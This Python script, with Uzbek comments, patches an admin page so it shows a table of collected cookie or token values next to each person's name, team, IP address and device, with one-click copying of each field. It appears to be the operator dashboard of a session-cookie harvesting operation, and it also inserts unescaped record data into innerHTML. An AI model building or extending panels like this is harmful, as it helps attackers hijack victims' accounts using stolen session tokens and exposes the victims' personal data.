with open('public/admin.html', 'r', encoding='utf-8') as f:
    lines = f.read().split('\n')

start_idx = -1
end_idx = -1

for i, line in enumerate(lines):
    if "document.getElementById('cookiesBody').innerHTML = res.cookies.map(" in line:
        start_idx = i
    if start_idx != -1 and i >= start_idx and ").join(" in line:
        end_idx = i
        break

if start_idx != -1 and end_idx != -1:
    replacement = """    document.getElementById('cookiesBody').innerHTML = res.cookies.map(c => {
        // 1. MongoDB ObjectId ichidan aniq vaqtni sug'urib olish funksiyasi (eng ishonchli usul)
        const getMongoTime = (id) => {
            try { return new Date(parseInt(id.toString().substring(0, 8), 16) * 1000).toLocaleString('uz-UZ'); } 
            catch(e) { return '-'; }
        };
        
        let timeVal = c.vaqt || c.time || c.createdAt || c.timestamp || c.date || '-';
        
        // 2. Agar vaqt kelmagan bo'lsa, uni _id dan olamiz, aks holda o'zini sanaga o'giramiz
        if (timeVal === '-' && (c._id || c.id)) {
            timeVal = getMongoTime(c._id || c.id);
        } else if (timeVal !== '-') {
            try {
                let d = new Date(timeVal);
                if (!isNaN(d.getTime())) timeVal = d.toLocaleString('uz-UZ');
            } catch(e) {}
        }
        
        const user = c.foydalanuvchi || c.user || c.username || c.name || '-';
        const team = c.team || '-';
        const ip = c.ip || c.ipAddress || '-';
        const device = c.qurilma || c.device || c.userAgent || 'Noma`lum';
        const cookieVal = c.cookie || c.value || c.token || '-';
        
        // 3. HTML chizish (nusxalash - clipboard.writeText orqali qulaylashtirilgan)
        return `
        <tr style="transition: all 0.2s;" onmouseover="this.style.backgroundColor='#2a3441'" onmouseout="this.style.backgroundColor='transparent'">
            <td style="white-space: nowrap; font-size: 0.85em; cursor: pointer; color: #00E5FF;" onclick="navigator.clipboard.writeText(this.innerText.trim()); alert('Vaqt nusxalandi!')" title="Nusxalash uchun bosing">${timeVal}</td>
            
            <td style="font-weight: bold; color: #4A7FFF; cursor: pointer;" onclick="navigator.clipboard.writeText(this.innerText.trim()); alert('Ism nusxalandi!')" title="Nusxalash uchun bosing">${user}</td>
            
            <td>${team}</td>
            
            <td style="max-width: 400px; word-break: break-all; white-space: normal !important; font-family: monospace; font-size: 0.85em; cursor: pointer;" onclick="navigator.clipboard.writeText(this.innerText.trim()); alert('Cookie nusxalandi!')" title="Nusxalash uchun bosing">
                <div style="background: #1a2332; padding: 6px; border-radius: 4px; border: 1px dashed #4A7FFF;">${cookieVal}</div>
            </td>
            
            <td style="cursor: pointer; color: #fff;" onclick="navigator.clipboard.writeText(this.innerText.trim()); alert('IP nusxalandi!')" title="Nusxalash uchun bosing">${ip}</td>
            
            <td style="max-width: 250px; word-break: break-word; white-space: normal !important; font-size: 0.8em; color: #aaa; cursor: pointer;" onclick="navigator.clipboard.writeText(this.innerText.trim()); alert('Qurilma nusxalandi!')" title="Nusxalash uchun bosing">${device}</td>
        </tr>
        `;
    }).join('');"""
    
    lines[start_idx:end_idx+1] = replacement.split('\n')
    
    with open('public/admin.html', 'w', encoding='utf-8') as f:
        f.write('\n'.join(lines))
    print("✅ Vaqt MongoDB ID orqali tiklandi va jadvalga to'liq kiritildi!")
else:
    print("❌ Kod bloki topilmadi.")
